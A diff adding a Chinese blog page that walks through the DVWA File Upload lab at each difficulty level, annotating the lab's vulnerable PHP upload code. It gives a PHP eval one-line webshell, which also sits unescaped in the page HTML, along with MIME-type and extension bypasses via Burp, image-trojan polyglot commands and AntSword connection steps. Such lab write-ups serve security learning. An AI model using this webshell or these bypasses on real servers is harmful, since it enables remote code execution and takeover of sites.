@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>DVWA File Upload | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    DVWA File Upload
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA-File-Upload"><span class="toc-number">1.</span> <span class="toc-text">DVWA File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low级别"><span class="toc-number">1.0.1.</span> <span class="toc-text">low级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium级别"><span class="toc-number">1.0.2.</span> <span class="toc-text">medium级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#high级别"><span class="toc-number">1.0.3.</span> <span class="toc-text">high级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impossible级别"><span class="toc-number">1.0.4.</span> <span class="toc-text">impossible级别</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="DVWA-File-Upload"><a href="#DVWA-File-Upload" class="headerlink" title="DVWA File Upload"></a>DVWA File Upload</h1><p>File Upload，即文件上传。文件上传漏洞通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。</p>
+<p><a href="https://www.cnblogs.com/0daybug/p/12311087.html" target="_blank" rel="noopener">这是文件上传漏洞很全的一个总结</a></p>
+<p>webshell概念：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p>
+<p><a href="https://www.jianshu.com/p/02aac12e459f" target="_blank" rel="noopener">参考博客</a></p>
+<p>常规的文件上传操作：<br>客户端上传：</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;title&gt;文件上传操作&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt;
+    头像：&lt;input type=&quot;file&quot; name=&quot;img&quot;&gt;&lt;br /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>在HTML <form>标签中enctype属性规定在发送到服务器之前应该如何对表单数据进行编码。</p>
+<p>它的值有三种：</p>
+<pre><code>application/x-www-form-urlencoded: 在发送前编码所有字符（默认）
+
+multipart/form-data: 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。
+
+text/plain: 空格转换为 &quot;+&quot; 加号，但不对特殊字符编码。</code></pre><p>服务端接收：</p>
+<p>使用$_FILES数组接收参数。</p>
+<p>我们打印$_FILES</p>
+<pre><code>print_r($_FILES);</code></pre><p>发现上传一个文件时的属性有：</p>
+<pre><code>[name] =&gt; feng.jpeg     文件的名称
+[type] =&gt; image/jpeg     文件的MIME类型
+[tmp_name] =&gt; C:\Users\Administrator\AppData\Local\Temp\php2007.tmp  文件的临时位置
+[error] =&gt; 0       文件的错误信息  0 ok      1234 error
+[size] =&gt; 2859    文件的大小</code></pre><p>文件上传漏洞的利用的条件：<br>1.能够成功上传木马文件<br>2.上传文件必须能够被执行<br>3.上传文件的路径必须可知</p>
+<p><a href="https://www.cnblogs.com/yyxianren/p/11381655.html" target="_blank" rel="noopener">参考博客</a></p>
+<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>源码：</strong></p>
+<pre><code class="php">&lt;?php 
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
+    // Where are we going to be writing to? 
+//isset() 函数用于检测变量是否已设置并且非 NULL。
+
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); 
+//这段代码是有关文件上传之后的位置的。basename(path,suffix)：path必需。规定要检查的路径。在Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。suffix:可选。规定文件扩展名。如果文件有suffix，则不会输出这个扩展名。
+
+    // Can we move the file to the upload folder? 能否可以上传？
+    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { 
+// 判断是否可以上传。move_uploaded_file(file,newloc)：file必需，规定要移动的文件。newloc必需，规定文件的新位置。
+
+//move_uploaded_file函数将上传的文件移动到新位置。
+        // No 即失败
+        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
+    } 
+    else { 
+        // Yes! 即成功
+        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
+        //返回文件路径
+    } 
+} 
+
+?&gt; </code></pre>
+<p> move_uploaded_file 函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p>
+<p>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。</p>
+<p><strong>实战：</strong></p>
+<p>1.这段代码对于上传文件的类型、内容等没有进行任何的过滤检查，直接将文件存储在 “hackable/uploads/“ 路径下。因此我们可以直接上传一个一句话木马文件进行攻击。<br><?php @eval($_POST['1']);?> （php一句话木马）</p>
+<p>上传后出现：../../hackable/uploads/1.php succesfully uploaded!</p>
+<p>浏览器访问（即输入url：127.0.0.1/DVWA-master/hackable/uploads/1.php）确定是否上传成功</p>
+<p>上传成功即可进行下一步。</p>
+<p>2.<a href="https://www.freesion.com/article/6380373568/#22_DVWAhackphp_28" target="_blank" rel="noopener">参考博客</a></p>
+<p>打开中国蚁剑，右键添加数据：URL地址填127.0.0.1/DVWA-master/hackable/uploads/1.php；连接密码写1（因为第一步写的一句话木马post提交的是1）；编码器选chr；点击添加。右键文件管理能看到列表即连接成功。</p>
+<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>源码：</strong></p>
+<pre><code class="php">&lt;?php 
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); 
+
+    // File information 文件信息（上传的文件）
+    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; 
+    $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; 
+    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; 
+
+    // Is it an image? 判断上传的文件是不是图片（是jpeg和png图片且大小小于100000字节）
+    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; 
+        ( $uploaded_size &lt; 100000 ) ) { 
+
+        // Can we move the file to the upload folder?我们能否上传文件？ 
+        if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { 
+            // No 
+            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
+        } 
+        else { 
+            // Yes! 
+            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
+            //还是一样会显示路径
+        } 
+    } 
+    else { //下边是：如果上传的文件不是图片返回的信息
+        // Invalid file 
+        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
+    } 
+} 
+
+?&gt; </code></pre>
+<p>多了需要上传图片的条件</p>
+<p><strong>实战：</strong>同样写<?php @eval($_POST['1']);?>,存成2.jpg，上传，用burpsuite拦截把jpg再改成php,打开蚁剑发现文件目录出现了2.jpg跟2.php。<a href="https://www.cnblogs.com/hyq0616-love/p/12661187.html" target="_blank" rel="noopener">参考博客</a></p>
+<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p>源码：</p>
+<pre><code class="php">&lt;?php 
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); 
+
+    // File information 文件信息
+    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; 
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //这句的意思是将文件的后缀名赋给$uploaded_ext。
+    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; 
+    $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; 
+//strrpos函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）；substr函数返回字符串的一部分。
+//strrpos(string,find,start):string必需。规定被搜索的字符串。find必需。规定要查找的字符.start可选。规定在何处开始搜索。
+
+    // Is it an image? 判断图片
+    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; 
+        ( $uploaded_size &lt; 100000 ) &amp;&amp; 
+        getimagesize( $uploaded_tmp ) ) { 
+//strtolower函数将所有字符转换为小写；getimagesize函数用于获取图像的大小及相关信息。
+
+        // Can we move the file to the upload folder? 同上
+        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
+            // No 
+            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
+        } 
+        else { 
+            // Yes! 
+            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; 
+        } 
+    } 
+    else { 
+        // Invalid file 
+        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
+    } 
+} 
+
+?&gt; </code></pre>
+<p><strong>实战：</strong></p>
+<p>不是对类型做限制，而是对后缀做了白名单限制。并且对图像内容做了检测。上传图片码解决</p>
+<p>1.制作图片马,命令行终端执行。（将代码和图片合为一体）</p>
+<pre><code>copy 1.jpg/b+3.php/a hack.jpg</code></pre><p>2.或者直接bp抓包，修改内容，加上图片头GIF89a</p>
+<ol>
+<li><p>上传1.jpg的木马文件，抓包</p>
+</li>
+<li><p>加上GIF89a的图片头，让其误以为内容是图片</p>
+<p><img src="https://img2020.cnblogs.com/blog/1962254/202005/1962254-20200503155942090-75242379.png" alt="img"></p>
+<p><a href="https://www.cnblogs.com/kbhome/p/12822233.html" target="_blank" rel="noopener">参考博客</a></p>
+</li>
+</ol>
+<h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p>源码：</p>
+<pre><code class="php">&lt;?php 
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) { 
+    // Check Anti-CSRF token 意为校验token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); 
+
+
+    // File information 
+    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; 
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //返回上传的文件名.后面的字符，即文件类型
+    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; 
+    $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; 
+    $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; 
+
+    // Where are we going to be writing to? 
+    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; 
+    //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; 
+    $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; 
+    $temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); 
+    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; //这边是重写文件名（在文件名前面加id再整体md5）
+//将上传的文件进行改名以及确定上传的目录位置。uniqid函数基于以微秒计的当前时间，生成一个唯一的 ID；ini_get函数用于获取一个配置选项的值或者说获取php.ini里的环境变量的值 。sys_get_temp_dir函数用于返回用于临时文件的目录。
+
+
+    // Is it an image? 仍旧限制了条件
+    if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; 
+        ( $uploaded_size &lt; 100000 ) &amp;&amp; 
+        ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; 
+        getimagesize( $uploaded_tmp ) ) { 
+
+        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 下边是将上传的图片重新编码
+        if( $uploaded_type == &#39;image/jpeg&#39; ) { 
+            $img = imagecreatefromjpeg( $uploaded_tmp ); 
+            imagejpeg( $img, $temp_file, 100); 
+//imagejpeg ( image , filename , quality)
+//从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。
+        } 
+        else { 
+            $img = imagecreatefrompng( $uploaded_tmp ); 
+            imagepng( $img, $temp_file, 9); 
+        } 
+        imagedestroy( $img );//imagedestroy函数销毁图像资源 
+//imagecreatefromjpeg ( filename )函数返回图片文件的图像标识，失败返回false
+
+        // Can we move the file to the web root from the temp folder? 意为是否可以将文件从临时目录转移到web根目录。
+//rename函数重命名文件或目录；getcwd函数用于获取当前的工作目录；
+        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
+            // Yes! 
+            echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; 
+        } 
+        else { 
+            // No 
+            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
+        } 
+
+        // Delete any temp files 意为删除所有临时文件。
+        if( file_exists( $temp_file ) )//file_exists函数用于检查文件或目录是否存在。 
+            unlink( $temp_file ); //unlink函数用于删除文件。
+    } 
+    else { 
+        // Invalid file 上传的文件不符合规则
+        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; 
+    } 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); //生成token
+
+?&gt; </code></pre>
+<p>函数学习：</p>
+<p>substr(string,start,length)<br>函数返回字符串的一部分</p>
+<p>strrpos(string,find,start)<br>函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p>
+<p>uniqid(prefix,more_entropy)：prefix可选，为 ID 规定前缀。如果两个脚本恰好在相同的微秒生成 ID，该参数很有用；more_entropy可选，规定位于返回值末尾的更多的熵。</p>
+<p>ini_get( string $varname )：varname必需，配置选项名称。</p>
+<p>ini_get拓展概念：成功是返回配置选项值的字符串，null 的值则返回空字符串。如果配置选项不存在，将会返回 FALSE。<br>注意: 当查询一个 boolean 值 ，一个 off 的 boolean ini 值将会以空字符串或者 “0” 返回；on 的 ini 值会以 “1” 返回。 此函数也会返回 INI 值的文字字符串。<br>注意: 当查询一个内存尺寸的值，许多内存尺寸的 ini 值，类似 upload_max_filesize 是以简写表示法储存在 php.ini 文件里。 ini_get() 会返回 php.ini 文件中储存的确切字符串，而不是它的等量 integer。尝试对这些值使用常规算术运算函数将不会得到预期的结果。 以上例子显示了转换简写表示法为字节的一种方式，和 PHP 源码所做的比较像。<br>注意: ini_get() 无法读取 “array” 的 ini 选项，例如 pdo.dsn.*，在这个例子中会返回 FALSE 。 </p>
+<p>getimagesize()<br>函数用来获取图像的大小和类型<br>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
+<p>扩展：</p>
+<p>源码中使用了一个非常不安全的的函数：<strong>getimagesize()</strong></p>
+<p>getimagesize()函数会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。</p>
+<p>getimagesize()返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。因为图片头可以被伪造，我们完全可以通过伪造正确的图片头来绕过它对图片类型的检查。</p>
+<p>这就是图片的十六进制，前几位都是一样的</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143107947-1812469690.png" alt="img"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143459251-1601347052.png" alt="img"></p>
+<p>按照这样的逻辑，我们就可以去伪造一个假图片，让函数以为我们这就是图片，达到绕过的目的。</p>
+<ul>
+<li>方法1 直接伪造头部GIF89A</li>
+<li>方法2 CMD：copy /b test.png+munma.php hack.png</li>
+<li>方法3 使用GIMP（开源的图片修改软件），通过增加备注，写入执行命令。</li>
+</ul>
+<p>但是，即使我们可以根据上述方法绕过函数getimagesize()，我们也绕不过imagecreatefromjpeg ( filename )、imagejpeg ( image , filename , quality)、imagedestroy( img )等几个函数对我们上传图片的重塑。所以，Impossible等级的代码是比较安全的。<a href="https://blog.csdn.net/weixin_43915842/article/details/90183305" target="_blank" rel="noopener">参考博客1</a>   <a href="https://www.cnblogs.com/zhengna/p/12764718.html" target="_blank" rel="noopener">参考博客2</a></p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-14</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
